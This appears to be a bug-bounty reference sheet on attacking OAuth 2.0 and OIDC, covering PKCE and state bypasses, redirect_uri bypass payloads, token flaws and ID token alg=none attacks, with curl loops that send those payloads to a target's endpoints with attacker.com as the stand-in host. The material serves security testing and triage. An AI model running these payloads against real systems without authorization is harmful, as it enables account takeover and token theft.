# OAUTH / OIDC — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 8), telegram-intel (@bugbountyresources #1075, @bugbountyusa tips), github-x-intel (HolyTips OAuth checklist, H1 reports), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Discover OAuth/OIDC endpoints (/authorize, /token, /userinfo, /.well-known/openid-configuration)
[ ] 2. Test PKCE enforcement (missing code_challenge = bypass)
[ ] 3. Test state parameter (missing, predictable, not verified = CSRF)
[ ] 4. Test redirect_uri validation (11 bypass techniques)
[ ] 5. Test code/token reuse, race conditions, cross-client validity
[ ] 6. Test OIDC-specific: nonce, ID token validation, discovery doc
[ ] 7. Prove impact: ATO = Critical, token theft = High
```

---

## OAUTH 2.0 FLOWS & ATTACK SURFACE

### Authorization Code Flow (Most Common)
```
1. Client → /authorize?response_type=code&client_id=X&redirect_uri=Y&state=Z&code_challenge=C
2. User authenticates + consents
3. Auth Server → redirect_uri?code=AUTH_CODE&state=Z
4. Client → /token (code + code_verifier) → access_token (+ refresh_token)
5. Client → /userinfo (access_token) → user data
```

### Implicit Flow (Legacy, Token in Fragment)
```
1. Client → /authorize?response_type=token&client_id=X&redirect_uri=Y&state=Z
2. User authenticates + consents
3. Auth Server → redirect_uri#access_token=TOKEN&state=Z
```

### Client Credentials (Machine-to-Machine)
```
Client → /token (grant_type=client_credentials) → access_token
```

### Resource Owner Password Credentials (Legacy)
```
Client → /token (grant_type=password, username, password) → access_token
```

### Device Authorization Flow (RFC 8628)
```
1. Client → /device_authorization → device_code, user_code, verification_uri
2. User visits verification_uri, enters user_code
3. Client polls /token with device_code → access_token
```

---

## ATTACK VECTORS (Complete Taxonomy)

### 1. PKCE Bypass (Coinbase Pattern)
```bash
# Test: Authorization request WITHOUT code_challenge
GET /oauth2/authorize?response_type=code&client_id=X&redirect_uri=Y&state=Z

# If 302 redirect (not error) = PKCE not enforced
# Impact: Auth code interception → ATO (no code_verifier needed)
```

### 2. State Parameter Bypass (CSRF on OAuth)
```bash
# Attack flow:
1. Attacker starts OAuth → gets authorize URL with state=ATTACKER_STATE
2. Attacker doesn't authorize, captures full URL
4. Sends URL to victim (phishing, chat, email)
5. Victim authorizes → their auth_code tied to ATTACKER's session
6. Attacker exchanges code → gets victim's access_token → ATO

# Test:
- Missing state parameter entirely
- Predictable state (timestamp, sequential, static)
- State not verified on callback
```

### 3. Redirect_uri Validation Bypass (11 Techniques)

| # | Technique | Example | Why It Works |
|---|-----------|---------|--------------|
| 1 | **@ symbol** | `https://legit.com@evil.com` | Browser navigates to evil.com |
| 2 | **Subdomain abuse** | `https://legit.com.evil.com` | evil.com controls subdomain |
| 3 | **Protocol tricks** | `javascript:alert(1)` | XSS via redirect |
| 4 | **Double encoding** | `%252f%252fevil.com` | Decodes to `//evil.com` |
| 5 | **Backslash** | `https://legit.com\@evil.com` | Parsers normalize `\` to `/` |
| 6 | **Protocol-relative** | `//evil.com` | Uses current page's protocol |
| 7 | **Null byte** | `https://legit.com%00.evil.com` | Some parsers truncate at null |
| 8 | **Unicode IDN** | `https://legіt.com` (Cyrillic і) | Visually identical, different domain |
| 9 | **Data URL** | `data:text/html,<script>...` | Direct payload |
| 10 | **Fragment abuse** | `https://legit.com#@evil.com` | Inconsistent parsing |
| 11 | **Redirect chain** | `target.com/callback?redirect_uri=..` | Redirect endpoint |

**Additional Bypass Vectors:**
```
# Path traversal in redirect_uri
?redirect_uri=https://legit.com/../evil.com

# Subdomain takeover + OAuth
?redirect_uri=https://subdomain-takeover.legit.com/callback

# Open redirect on allowed domain
?redirect_uri=https://legit.com/redirect?url=https://evil.com

# Case sensitivity
?redirect_uri=https://LEGIT.COM/callback

# Trailing slash / path confusion
?redirect_uri=https://legit.com/callback/
?redirect_uri=https://legit.com/callback..
```

### 4. Code Flaws
```bash
# Re-using authorization code
# Exchange code once → capture response → replay code → second token

# Code prediction / brute force
# If code is short/numeric/sequential → brute force

# Cross-client code validity
# Code issued for client_id=A valid for client_id=B?
```

### 5. Token Flaws
```bash
# Access token reuse across clients
# Token issued for client A accepted by resource server for client B

# Refresh token reuse
# Refresh token not rotated → stolen refresh = persistent access

# ID token validation (OIDC)
# - sig not verified (alg=none, weak key)
# - aud not checked (token for client A used on client B)
# - exp not checked (expired token accepted)
# - iss not checked (token from different issuer)
# - nonce not checked (replay attack)
```

### 6. Race Conditions
```bash
# Code exchange race
# Simultaneous /token requests with same code → both succeed

# Refresh token race
# Simultaneous refresh → both get new access tokens

# Revocation race
# User revokes access → code still usable?
```

### 6. OIDC-Specific
```bash
# Discovery document (.well-known/openid-configuration)
# - endpoints exposed (authorization_endpoint, token_endpoint, jwks_uri)
# - Check for misconfig (wrong issuer, exposed internals)

# Dynamic Client Registration
# POST /register → client_id, client_secret
# Test: register malicious redirect_uri

# ID Token attacks
# - alg=none → bypass signature
# - key confusion (RSA public key as HMAC secret)
# - kid injection (JWKS manipulation)

# Hybrid flow attacks
# response_type=code id_token → token in fragment + code in query
```

---

## HOLYTIPS OAUTH CHECKLIST (Complete)

### Code Flaws
```
[ ] Re-Using the code
[ ] Code Predict/Bruteforce and Rate-limit?
[ ] Is the code for application X valid for application Y?
```

### Redirect_uri Flaws
```
[ ] URL isn't validated at all: ?redirect_uri=https://attacker.com
[ ] Subdomains allowed (Subdomain Takeover or Open redirect): ?redirect_uri=https://sub.twitterdeck.com
[ ] Host validated, path isn't (Chain open redirect): ?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com
[ ] Host validated, path isn't (Referer leakages): Include external content on HTML page and leak code via Referer
[ ] Weak Regexes:
    ?redirect_uri=https://twitterdeck.com.evil.com
    ?redirect_uri=https://twitterdeck.com%252eevil.com
    ?redirect_uri=https://twitterdeck.com//evil.com/
    ?redirect_uri=https://twitterdeck.com%09evil.com
[ ] Bruteforcing URL encoded chars after host: ?redirect_uri=https://twitterdeck.com§FUZZ§
[ ] Bruteforcing keywords whitelist after host: ?redirect_uri=https://§FUZZ§.com
[ ] URI validation in place: use typical open redirect payloads
```

### State Flaws
```
[ ] Missing State parameter? (CSRF)
[ ] Predictable State parameter?
[ ] Is State parameter being verified?

CSRF Workflow:
1. Attacker generates valid authorization_code link for himself (doesn't use it)
2. Attacker sends link to logged-in victim
3. Victim opens link → attacker's OAuth account linked to victim's
```

### Evil App
```
[ ] Race condition when code exchanged for access_token
[ ] Race condition when refresh_token exchanged for access_token
[ ] If user revocates access, will code be also revocated?
```

### Misc
```
[ ] Is client_secret validated?
[ ] Are client_secret, access_token, refresh_token leaking somewhere?
[ ] Pre ATO using facebook phone-number signup
[ ] No email validation Pre ATO (register victim email, link accounts)
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$5,580** | Mint OAuth2 access token for targeted user | GitLab | OAuth token theft |
| **—** | OAuth Redirect → ATO | securitycipher daily, GitLab | redirect_uri validation bypass |
| **—** | Authentication Token Theft via Open Redirect in Callback URL | lemlist | Open redirect chain |
| **—** | 0-Click ATO via Password Reset | Remitly | OAuth + reset chain |
| **—** | Pre ATO using facebook phone-number signup | Multiple | Email verification bypass |

---

## OAUTH CHAINS THAT PAY

```
Missing PKCE + Auth code interception              → Critical (ATO)
Missing state + CSRF on OAuth                      → Critical (ATO)
Redirect_uri bypass (any 11 techniques)            → Critical (ATO)
Redirect_uri path validation bypass + open redirect → Critical (ATO)
State parameter predictable + CSRF                  → Critical (ATO)
Code reuse + no rate limit                         → High
Cross-client code validity                         → High
Refresh token not rotated + stolen                 → High (Persistent)
ID token alg=none / key confusion                  → Critical (ATO)
Nonce missing in OIDC + replay                     → High
Dynamic client registration + malicious redirect   → Critical
Pre-ATO via facebook email (unverified)            → High
No email validation + OAuth account linking        → Critical (ATO)
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Discover OAuth endpoints
curl -s "https://target.com/.well-known/openid-configuration" | jq .
curl -s "https://target.com/.well-known/oauth-authorization-server" | jq .

# Test PKCE enforcement
curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com" -w "%{http_code}\n" -o /dev/null

# Test state parameter
curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com" -w "%{http_code}\n" -o /dev/null
# vs
curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com&state=random" -w "%{http_code}\n" -o /dev/null

# Test redirect_uri bypasses (11 techniques)
for payload in \
  "https://legit.com@evil.com" \
  "https://legit.com.evil.com" \
  "javascript:alert(1)" \
  "%252f%252fevil.com" \
  "https://legit.com\\@evil.com" \
  "//evil.com" \
  "https://legit.com%00.evil.com" \
  "https://legit.com#@evil.com" \
  "data:text/html,<script>alert(1)</script>" \
  "https://legit.com/../evil.com" \
  "https://legit.com/callback?redirectUrl=https://evil.com"; do
  curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=$(echo -n "$payload" | jq -sRr @uri)" -w "$payload: %{http_code}\n" -o /dev/null
done

# Test state parameter missing/predictable
for state in "" "test" "12345" "static" "$(date +%s)"; do
  curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com&state=$state" -w "state=$state: %{http_code}\n" -o /dev/null
done

# Dynamic client registration
curl -X POST "https://target.com/register" -d '{"redirect_uris":["https://attacker.com"]}'

# Token endpoint tests
curl -X POST "https://target.com/oauth2/token" -d "grant_type=client_credentials&client_id=TEST&client_secret=TEST"

# ID token alg=none test
# Modify JWT header to {"alg":"none","typ":"JWT"} → remove signature

# Dynamic client registration + malicious redirect
curl -X POST "https://target.com/register" -d '{"redirect_uris":["https://attacker.com/callback"]}'
```

---

## OIDC-SPECIFIC TESTS

```bash
# 1. Discovery document
curl -s "https://target.com/.well-known/openid-configuration" | jq .

# 2. JWKS endpoint
curl -s "https://target.com/oauth2/jwks" | jq .

# 3. ID Token validation
# - Check alg (not "none")
# - Check aud (matches your client_id)
# - Check exp (not expired)
# - Check iss (matches expected issuer)
# - Check nonce (if sent in auth request)

# 4. Hybrid flow
# response_type=code id_token → token in fragment, code in query

# 5. Userinfo endpoint
curl -H "Authorization: Bearer ACCESS_TOKEN" "https://target.com/userinfo"

# 6. End session / logout
curl "https://target.com/oidc/logout?id_token_hint=ID_TOKEN&post_logout_redirect_uri=https://attacker.com"

# 7. Token revocation
curl -X POST "https://target.com/oauth2/revoke" -d "token=ACCESS_TOKEN&client_id=CLIENT_ID"
```

---

## TRIAGE DECISION TREE

```
1. Can attacker achieve ATO via OAuth?
   - PKCE missing + code intercept              → Critical
   - State missing/predictable + CSRF           → Critical
   - Redirect_uri bypass (any technique)        → Critical
   - Code reuse + no rate limit                 → High
   - ID token alg=none / key confusion          → Critical
   - Pre-ATO via unverified email linking       → Critical

2. Can attacker steal tokens?
   - Refresh token not rotated                  → High
   - Cross-client token validity                → High
   - Token in Referer (implicit flow)           → Medium
   - Token in URL fragment (leak via history)   → Medium

3. Can attacker escalate privileges?
   - Dynamic client registration                → Critical
   - Scope upgrade (request more scopes)        → Medium
   - Token exchange (impersonation)             → High
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| PKCE not enforced but no auth code intercept vector | Theoretical = N/A |
| State missing but no CSRF delivery vector | Theoretical = N/A |
| Redirect_uri bypass on non-sensitive scope | Low/Info |
| Code brute force but rate limited | Not exploitable = N/A |
| Refresh token reuse but rotated per use | Not vulnerable = N/A |
| OIDC discovery doc exposed (standard) | Not a bug = N/A |
| "Could chain if..." without chain built | Theoretical = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `oauth-tools` / `oauth2-proxy` | Test PKCE, state, redirect_uri |
| `saml-raider` (Burp) | SAML/OAuth testing |
| `Burp Suite` | Manual OAuth flow testing |
| `oauth2-client` libraries | Automated flow testing |
| `jwt_tool` | JWT/ID token attacks (alg=none, key confusion) |
| `nuclei` templates | OAuth/OIDC templates |
| `ffuf` | Redirect_uri fuzzing, state fuzzing |
| Custom scripts | Race condition testing |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 8 (PKCE, State, 11 Redirect bypasses)
- telegram-intel: @bugbountyresources OAuth checklist reference
- github-x-intel: HolyTips OAuth checklist (complete), H1 reports (GitLab $5.5k, lemlist, securitycipher)
- bountyforge: OAuth as ATO chain starter, redirect_uri bypass table
- bb-methodology: What-If experiments (OAuth CSRF), Critical Thinking
- PortSwigger: OAuth labs, "The Wonderful World of OAuth" (Medium)
- HackTricks: OAuth/OIDC methodology
- RFC 6749 (OAuth 2.0), RFC 7636 (PKCE), RFC 8628 (Device Flow)
- OpenID Connect Core 1.0